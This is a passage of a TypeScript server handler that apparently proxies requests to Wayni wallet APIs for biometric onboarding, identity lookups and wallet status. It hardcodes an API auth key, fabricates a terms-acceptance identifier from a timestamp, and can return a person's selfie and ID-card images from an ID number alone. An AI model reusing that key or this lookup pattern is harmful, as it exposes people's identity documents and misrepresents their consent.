          city_id: Number(city_id),
          city: String(city),
          region_id: Number(region_id),
          region: String(region),
          terms_and_conditions_identifier: `terms_${Date.now().toString(16)}`,
        }),
      });

      const data = await safeJson(res);
      if (!res.ok) throw new Error(data?.message || "Error al guardar dirección");

      return new Response(JSON.stringify({ success: true, message: data.message || "Address saved" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ─── ACTION: onboarding_biometric ───
    if (action === "onboarding_biometric") {
      const { identity_number, user_uuid, gender } = body;
      if (!identity_number || !user_uuid) throw new Error("Missing identity_number or user_uuid");

      const BIOMETRIC_URL = "https://billetera.waynimovil.ar/me/api/v1/me/onboarding/biometric";
      console.log("[wayni] biometric request for", identity_number);

      const bioRes = await proxyFetch(BIOMETRIC_URL, {
        method: "POST",
        headers: {
          ...COMMON_HEADERS,
          "Host": "billetera.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
        body: JSON.stringify({
          documentNumber: identity_number,
          userUuid: user_uuid,
          gender: gender || "M",
        }),
      });

      const bioData = await safeJson(bioRes, {});
      if (!bioRes.ok || !bioData?.url) {
        throw new Error(bioData?.message || "Error al generar enlace biométrico");
      }

      return new Response(JSON.stringify({
        success: true,
        biometric_url: bioData.url,
        biometric_id: bioData.externalIdentifier || null,
        external_ref_id: bioData.externalRefId || null,
        status: bioData.status || null,
        origin: bioData.origin || null,
        supplier: bioData.supplier || null,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: get_biometric_info ───
    if (action === "get_biometric_info") {
      const { identity_number, include_images } = body;
      if (!identity_number) throw new Error("Missing identity_number");

      const res = await proxyFetch(`https://billetera.waynimovil.ar/me/api/v1/me/onboarding/biometric/getInformation/${identity_number}`, {
        method: "GET",
        headers: {
          ...COMMON_HEADERS,
          "Host": "billetera.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
      });

      const data = await safeJson(res, {});
      if (!res.ok) {
        console.warn("[wayni] get_biometric_info non-OK:", res.status, JSON.stringify(data).slice(0, 200));
        return new Response(JSON.stringify({
          success: false,
          code: "UPSTREAM_UNAVAILABLE",
          error: data?.message || `Biometría no disponible (${res.status})`,
        }), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Document validation status
      const has_selfie = !!data.selfie && typeof data.selfie === "string" && data.selfie.length > 100;
      const has_dni_front = !!data.dniFront && typeof data.dniFront === "string" && data.dniFront.length > 100;
      const has_dni_back = !!data.dniBack && typeof data.dniBack === "string" && data.dniBack.length > 100;

      const result: Record<string, unknown> = {
        success: true,
        dni: data.dni || identity_number,
        identifier: data.identifier || null,
        external_ref_id: data.externalRefId || null,
        status: data.status || null,
        current_action: data.currentAction || null,
        last_completed_section: data.lastCompletedSection || null,
        enrollment_flow: data.enrollmentFlow || null,
        created_at: data.createdAt || null,
        updated_at: data.updatedAt || null,
        tags: data.tags || [],
        facematching: data.facematching || null,
        first_name: data.firstName || null,
        last_name: data.lastName || null,
        birthdate: data.birthdate || null,
        origin: data.origin || null,
        supplier: data.supplier || null,
        // Document validation booleans
        has_selfie,
        has_dni_front,
        has_dni_back,
      };

      // Include base64 images only if explicitly requested
      if (include_images) {
        result.selfie_img = data.selfie || null;
        result.dni_front_img = data.dniFront || null;
        result.dni_back_img = data.dniBack || null;
      }

      return new Response(JSON.stringify(result), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: check_biometric_status ───
    if (action === "check_biometric_status") {
      const { identity_number } = body;
      if (!identity_number) throw new Error("Missing identity_number");

      console.log("[wayni] check_biometric_status for", identity_number);

      // 1. Get biometric info
      const bioRes = await proxyFetch(`https://billetera.waynimovil.ar/me/api/v1/me/onboarding/biometric/getInformation/${identity_number}`, {
        method: "GET",
        headers: {
          ...COMMON_HEADERS,
          "Host": "billetera.waynimovil.ar",
          "x-correlation-id": makeCorrelationId(),
        },
      });

      let bioData: any = null;
      let biometric_ok = false;
      let facematching_confidence = 0;
      try {
        bioData = await safeJson(bioRes, {});
        biometric_ok = bioData?.status === "success" && bioData?.facematching?.code === 200;
        facematching_confidence = bioData?.facematching?.confidence || 0;
      } catch { /* ignore parse errors */ }

      // 2. Get wallet status
      const AUTH_KEY = "JrZsFIyVJZTSAcRe5EdVwegbIa4P1yTKmrHyry9r";
      const walletRes = await proxyFetch(`https://auth.waynimovil.ar/api/v1/public/user/${identity_number}/wallet`, {
        method: "GET",
        headers: {
          ...COMMON_HEADERS,
          "Host": "auth.waynimovil.ar",
          "x-ms-auth-key": AUTH_KEY,
          "x-correlation-id": makeCorrelationId(),
        },
      });

      let walletData: any = null;
      let wallet_status = "unknown";
      try {
        walletData = await safeJson(walletRes, {});
        wallet_status = walletData?.status || "unknown";
      } catch { /* ignore */ }

      console.log("[wayni] biometric_ok:", biometric_ok, "wallet_status:", wallet_status, "confidence:", facematching_confidence);

      return new Response(JSON.stringify({
        success: true,
        biometric_ok,
        biometric_status: bioData?.status || null,
        facematching: bioData?.facematching || null,
        facematching_confidence,
        last_completed_section: bioData?.lastCompletedSection || null,
        first_name: bioData?.firstName || null,
        last_name: bioData?.lastName || null,
        wallet_status,
        wallet_uuid: walletData?.uuid || null,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─── ACTION: get_wallet_status ───
    if (action === "get_wallet_status") {
      const { identity_number } = body;
      if (!identity_number) throw new Error("Missing identity_number");

      const AUTH_KEY = "JrZsFIyVJZTSAcRe5EdVwegbIa4P1yTKmrHyry9r";
      let res: Response;
      try {
        res = await proxyFetch(`https://auth.waynimovil.ar/api/v1/public/user/${identity_number}/wallet`, {
          method: "GET",
          headers: {
            ...COMMON_HEADERS,
            "Host": "auth.waynimovil.ar",
            "x-ms-auth-key": AUTH_KEY,
            "x-correlation-id": makeCorrelationId(),
          },
        });
      } catch {
        return new Response(JSON.stringify({
          success: false, code: "UPSTREAM_UNAVAILABLE",
          error: "Servicio temporalmente no disponible.",
        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      let data: any = {};
      try {
        const text = await res.text();
        data = JSON.parse(text);
      } catch {
        return new Response(JSON.stringify({
          success: false, code: "UPSTREAM_UNAVAILABLE",
          error: "Respuesta inválida del servidor Wayni.",
        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      return new Response(JSON.stringify({
        success: res.ok,
        uuid: data.uuid || null,
        status: data.status || null,
        pomelo_user: data.pomelo_user || null,
        pomelo_user_created_at: data.pomelo_user_created_at || null,
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    throw new Error(`Unknown action: ${action}`);
  } catch (err) {
    console.error("[wayni-auth] Error:", err);
    const message = (err as Error)?.message || "Error interno";
    const isUpstreamIssue = /proxy|network|fetch|timeout|temporariamente|temporarily/i.test(message);

    return new Response(JSON.stringify({
      success: false,
      code: isUpstreamIssue ? "UPSTREAM_UNAVAILABLE" : "REQUEST_FAILED",
      error: isUpstreamIssue
        ? "Servicio temporalmente no disponible. Intentá nuevamente."
        : message,
    }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
